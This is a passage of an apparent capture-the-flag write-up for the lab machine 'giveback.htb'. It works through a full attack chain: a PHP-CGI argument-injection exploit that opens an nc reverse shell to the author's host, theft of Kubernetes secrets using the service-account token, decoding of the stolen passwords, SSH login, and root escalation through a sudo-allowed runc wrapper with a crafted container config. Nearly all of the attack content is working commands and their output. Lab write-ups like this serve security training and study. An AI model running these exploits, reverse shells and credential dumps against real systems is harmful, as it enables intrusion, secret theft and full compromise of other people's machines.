- Migrated to Linux but **kept Windows-style CGI handling**
- This creates a **misconfiguration**

```html
<p>**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.</p>
```

We can try this parameter injection:

```bash
I have no name!@beta-vino-wp-wordpress-779bf669bd-nfqnf:/run$
php -r '$u="http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"; $d="nc 10.10.15.211 9001 -e sh"; $h="Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: curl/7.79.1\r\n"; $ctx=stream_context_create(["http"=>["method"=>"POST","header"=>$h,"content"=>$d]]); echo file_get_contents($u,false,$ctx);'
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.15.211] from (UNKNOWN) [10.10.11.94] 46750

whoami
root
```
### Why This Works:

1. **Legacy CGI Support**: Windows-style PHP-CGI allows passing parameters via URL
2. **Misconfiguration**: `allow_url_include` and `auto_prepend_file` are enabled
3. **Parameter Injection**: We can inject PHP settings through the query string
4. **Code Execution**: `php://input` executes POST data as PHP code

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.15.211] from (UNKNOWN) [10.10.11.94] 46750

whoami
root
python3 -c 'import pty; pty.spawn("/bin/bash")'

ls
php-cgi
cd /root
ls
cd /home
ls
www-data
cd www-data
ls
ls
uname -a
Linux legacy-intranet-cms-6f7bf5db84-lfw7l 5.15.0-124-generic #134-Ubuntu SMP Fri Sep 27 20:20:17 UTC 2024 x86_64 Linux
```

Check if Kubernetes service account exists:

```bash
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
total 4
drwxrwxrwt    3 root     root           140 Nov  5 14:04 .
drwxr-xr-x    3 root     root          4096 Nov  5 13:15 ..
drwxr-xr-x    2 root     root           100 Nov  5 14:04 ..2025_11_05_14_04_01.3130988639
lrwxrwxrwx    1 root     root            32 Nov  5 14:04 ..data -> ..2025_11_05_14_04_01.3130988639
lrwxrwxrwx    1 root     root            13 Nov  5 13:15 ca.crt -> ..data/ca.crt
lrwxrwxrwx    1 root     root            16 Nov  5 13:15 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root            12 Nov  5 13:15 token -> ..data/token
```

We are still in Kubernetes. Check environment variable:

```bash
env
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT=443
HOSTNAME=legacy-intranet-cms-6f7bf5db84-b4z8d
PHP_INI_DIR=/usr/local/etc/php
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
WP_NGINX_SERVICE_SERVICE_PORT=80
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
SHLVL=4
PHP_CGI_VERSION=8.3.3
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
HOME=/root
PHP_LDFLAGS=-Wl,-O1 -pie
LEGACY_CGI_ENABLED=true
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
PHP_VERSION=8.3.3
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_MODE=enabled
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-8.3.3.tar.xz.asc
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
PHP_URL=https://www.php.net/distributions/php-8.3.3.tar.xz
PHP_MAX_EXECUTION_TIME=120
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
KUBERNETES_PORT_443_TCP_PORT=443
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
PHP_MEMORY_LIMIT=128M
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
KUBERNETES_PORT_443_TCP_PROTO=tcp
CMS_ENVIRONMENT=development
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
PHPIZE_DEPS=autoconf            dpkg-dev dpkg           file            g++             gcc             libc-dev                make            pkgconf             re2c
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
KUBERNETES_SERVICE_HOST=10.43.0.1
PWD=/var/www/html/cgi-bin
PHP_SHA256=b0a996276fe21fe9ca8f993314c8bc02750f464c7b0343f056fb0894a8dfa9d1
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
```
### Services in the Cluster:

- **Kubernetes API**: `10.43.0.1:443`
- **WordPress Service**: `10.43.61.204:80/443` (where we started)
- **MySQL Database**: `10.43.147.82:3306`
- **Nginx Service**: `10.43.4.242:80`
- **Legacy Intranet Service**: `10.43.2.241:5000` (current CMS we exploited)

```
My Machine → WordPress Pod (10.42.1.182) → CMS Pod (10.43.2.241) → Kubernetes API (10.43.0.1)
```

- **Pod Name**: `legacy-intranet-cms-6f7bf5db84-b4z8d`
- **Current Directory**: `/var/www/html/cgi-bin`
### Now Let's Use the Kubernetes API:

First check if we can even access it:

```bash
curl -k https://10.43.0.1:443/ -I
HTTP/2 401
audit-id: 6af1deaf-c6f6-4a0b-aab5-dd59f6bfc4c9
cache-control: no-cache, private
content-type: application/json
content-length: 157
date: Wed, 05 Nov 2025 14:40:44 GMT
```

```bash
# Get token and namespace
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
echo "Namespace: $NAMESPACE"
```

```bash
# Access Kubernetes secrets
curl -k -H "Authorization: Bearer $TOKEN" https://10.43.0.1:443/api/v1/namespaces/$NAMESPACE/secrets
<SNIP>
STR5Um8vY0JBQT0="
      },
      "type": "helm.sh/release.v1"
    },
    {
      "metadata": {
        "name": "user-secret-babywyrm",
        "namespace": "default",
        "uid": "d4678d69-1f0e-4f2b-8f5b-00fd9cdf9bc6",
        "resourceVersion": "2855851",
        "creationTimestamp": "2025-11-05T13:15:55Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-babywyrm",
            "uid": "f04985b2-7289-44e9-bcb0-3a422a5425b6",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-11-05T13:15:55Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:MASTERPASS": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"f04985b2-7289-44e9-bcb0-3a422a5425b6\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "MASTERPASS": "aVNWZExYS0R5S0pmYUM4YTkzU1phNWFaNDhnMEtMNw=="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "user-secret-margotrobbie",
        "namespace": "default",
        "uid": "969df862-c6ee-4797-bb2e-86552acc662f",
        "resourceVersion": "2855871",
        "creationTimestamp": "2025-11-05T13:16:01Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-margotrobbie",
            "uid": "1e17438b-745c-4e87-8dc9-d38ca32dc172",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-11-05T13:16:01Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:USER_PASSWORD": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"1e17438b-745c-4e87-8dc9-d38ca32dc172\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "USER_PASSWORD": "NGdyNk5aTE1FZHBXVkdhZXk4R3RISElTVndVa1JoREc="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "user-secret-sydneysweeney",
        "namespace": "default",
        "uid": "3baae4b5-0eb8-4dd7-9bce-93e083b7bac5",
        "resourceVersion": "2855865",
        "creationTimestamp": "2025-11-05T13:15:59Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-sydneysweeney",
            "uid": "3670c1b9-a651-47e3-995b-0c2458b48602",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-11-05T13:15:59Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:USER_PASSWORD": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"3670c1b9-a651-47e3-995b-0c2458b48602\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "USER_PASSWORD": "NUZrSWZHQ1NXemdEQ1lKVXZ2MVRaMTFpMVJha1Q0TVk="
      },
      "type": "Opaque"
    }
  ]
}
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ # Decode the MASTERPASS for babywyrm
echo "aVNWZExYS0R5S0pmYUM4YTkzU1phNWFaNDhnMEtMNw==" | base64 -d
echo
iSVdLXKDyKJfaC8a93SZa5aZ48g0KL7

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ # Decode the USER_PASSWORD for margotrobbie
echo "NGdyNk5aTE1FZHBXVkdhZXk4R3RISElTVndVa1JoREc=" | base64 -d
echo
4gr6NZLMEdpWVGaey8GtHHISVwUkRhDG

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ # Decode the USER_PASSWORD for sydneysweeney
echo "NUZrSWZHQ1NXemdEQ1lKVXZ2MVRaMTFpMVJha1Q0TVk=" | base64 -d
echo
5FkIfGCSWzgDCYJUvv1TZ11i1RakT4MY
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ ssh babywyrm@giveback.htb
The authenticity of host 'giveback.htb (10.10.11.94)' can't be established.
ED25519 key fingerprint is SHA256:QW0UEukNwOzzXzOIYR311JYiuhYUEv8FYbRgwiKZ35g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'giveback.htb' (ED25519) to the list of known hosts.
babywyrm@giveback.htb's password: iSVdLXKDyKJfaC8a93SZa5aZ48g0KL7
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Nov 5 14:53:27 2025 from 10.10.15.211
babywyrm@giveback:~$ ls
user.txt
```
# Privilege Escalation

```bash
babywyrm@giveback:~$ sudo -l
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

```bash
babywyrm@giveback:~$ sudo /opt/debug --help
[sudo] password for babywyrm:
Validating sudo...
Please enter the administrative password:

Incorrect password
```

We dunno second password. In our first shell:

```bash
/secrets$ cat mariadb-password
sW5sp4spa3u7RLyetrekE4oS
```

Base64 encode the `sW5sp4spa3u7RLyetrekE4oS` password:

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/CVE-2024-5932]
└─$ echo -n "sW5sp4spa3u7RLyetrekE4oS" | base64
c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T
```

`c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T` use this encoded password.

```bash
babywyrm@giveback:/var/log/audit$ sudo /opt/debug --help
Validating sudo...
Please enter the administrative password: c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T

Both passwords verified. Executing the command...
NAME:
   runc - Open Container Initiative runtime

runc is a command line client for running applications packaged according to
the Open Container Initiative (OCI) format and is a compliant implementation of the
Open Container Initiative specification.

runc integrates well with existing process supervisors to provide a production
container runtime environment for applications. It can be used with your
existing process monitoring tools and the container will be spawned as a
direct child of the process supervisor.

Containers are configured using bundles. A bundle for a container is a directory
that includes a specification file named "config.json" and a root filesystem.
The root filesystem contains the contents of the container.

To start a new instance of a container:

    # runc run [ -b bundle ] <container-id>

Where "<container-id>" is your name for the instance of the container that you
are starting. The name you provide for the container instance must be unique on
your host. Providing the bundle directory using "-b" is optional. The default
value for "bundle" is the current directory.

USAGE:
   runc.amd64.debug [global options] command [command options] [arguments...]

VERSION:
   1.1.11
commit: v1.1.11-0-g4bccb38c
spec: 1.0.2-dev
go: go1.20.12
libseccomp: 2.5.4

COMMANDS:
   checkpoint  checkpoint a running container
   create      create a container
   delete      delete any resources held by the container often used with detached container
   events      display container events such as OOM notifications, cpu, memory, and IO usage statistics
   exec        execute new process inside the container
   kill        kill sends the specified signal (default: SIGTERM) to the container's init process
   list        lists containers started by runc with the given root
   pause       pause suspends all processes inside the container
   ps          ps displays the processes running inside a container
   restore     restore a container from a previous checkpoint
   resume      resumes all processes that have been previously paused
   run         create and run a container
   spec        create a new specification file
   start       executes the user defined process in a created container
   state       output the state of a container
   update      update container resource constraints
   features    show the enabled features
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug             enable debug logging
   --log value         set the log file to write runc logs to (default is '/dev/stderr')
   --log-format value  set the log format ('text' (default), or 'json') (default: "text")
   --root value        root directory for storage of container state (this should be located in tmpfs) (default: "/run/runc")
   --criu value        path to the criu binary used for checkpoint and restore (default: "criu")
   --systemd-cgroup    enable systemd cgroup support, expects cgroupsPath to be of form "slice:prefix:name" for e.g. "system.slice:runc:434234"
   --rootless value    ignore cgroup permission errors ('true', 'false', or 'auto') (default: "auto")
   --help, -h          show help
   --version, -v       print the version
```

It shows:

```
runc is a command line client for running applications packaged according to
the Open Container Initiative (OCI) format
```

**OCI** = **Open Container Initiative** - a standard for container runtimes (like Docker, containerd, etc.)

An **OCI Bundle** is a directory that contains:

1. `config.json` - Container configuration (what to run, resources, mounts, etc.)
2. `rootfs/` - The container's root filesystem

I made config file to just read the flag you can make for shell if you want:

```bash
babywyrm@giveback:/var/log/audit$ mkdir -p /tmp/rootshell
babywyrm@giveback:/var/log/audit$ cd /tmp/rootshell
babywyrm@giveback:/tmp/rootshell$ mkdir -p rootfs
```

```bash
babywyrm@giveback:/tmp/rootshell$ cd /tmp/rootshell
babywyrm@giveback:/tmp/rootshell$ cat > config.json << 'EOF'
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/cat", "/root/root.txt"],
    "cwd": "/",
    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "terminal": false
  },
  "root": {"path": "rootfs"},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind","ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind","ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind","ro"]},
    {"destination": "/root", "type": "bind", "source": "/root", "options": ["bind","ro"]}
  ],
  "linux": {"namespaces": [{"type": "mount"}]}
}
EOF
babywyrm@giveback:/tmp/rootshell$ sudo /opt/debug run rootshell
Validating sudo...
Please enter the administrative password:

Both passwords verified. Executing the command...
83aa242cf3d623a31d57ffc14b9c7d19
```

---